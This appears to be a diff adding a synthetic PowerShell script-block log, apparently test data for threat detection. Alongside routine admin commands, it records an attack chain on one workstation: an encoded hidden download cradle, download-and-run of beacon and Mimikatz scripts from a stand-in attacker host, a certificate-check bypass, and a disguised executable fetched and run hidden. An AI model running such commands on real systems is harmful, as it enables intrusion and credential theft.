@@ -1,0 +1,10 @@
+Jan 15 10:15:00 WKSTN-PC47 EventCode=4104 Message="Creating Scriptblock text (1 of 1): Get-Process" User=CORP\jsmith
+Jan 15 10:15:30 WKSTN-PC12 EventCode=4104 Message="Creating Scriptblock text (1 of 1): Get-Service" User=CORP\mwilson
+Jan 15 10:16:00 WKSTN-PC47 EventCode=4104 Message="Creating Scriptblock text (1 of 1): powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC0AcABhAHkAbABvAGEAZAAuAGEAdAB0AGEAYwBrAGUAcgAuAG4AZQB0AC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==" User=CORP\admin_temp
+Jan 15 10:16:30 WKSTN-PC47 EventCode=4104 Message="Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://evil-payload.attacker.net/beacon.ps1')" User=CORP\admin_temp
+Jan 15 10:17:00 WKSTN-PC23 EventCode=4104 Message="Creating Scriptblock text (1 of 1): Get-ChildItem C:\Users" User=CORP\analyst1
+Jan 15 10:17:30 WKSTN-PC47 EventCode=4104 Message="Creating Scriptblock text (1 of 1): Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-payload.attacker.net/mimikatz.ps1')" User=CORP\admin_temp
+Jan 15 10:18:00 SRV-FILE01 EventCode=4104 Message="Creating Scriptblock text (1 of 1): Get-ADUser -Filter *" User=CORP\svc_admin
+Jan 15 10:18:30 WKSTN-PC47 EventCode=4104 Message="Creating Scriptblock text (1 of 1): [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IWR http://evil-payload.attacker.net/stage2.exe -OutFile C:\temp\update.exe" User=CORP\admin_temp
+Jan 15 10:19:00 WKSTN-PC15 EventCode=4104 Message="Creating Scriptblock text (1 of 1): Test-NetConnection google.com -Port 443" User=CORP\helpdesk
+Jan 15 10:19:30 WKSTN-PC47 EventCode=4104 Message="Creating Scriptblock text (1 of 1): Start-Process C:\temp\update.exe -WindowStyle Hidden" User=CORP\admin_temp
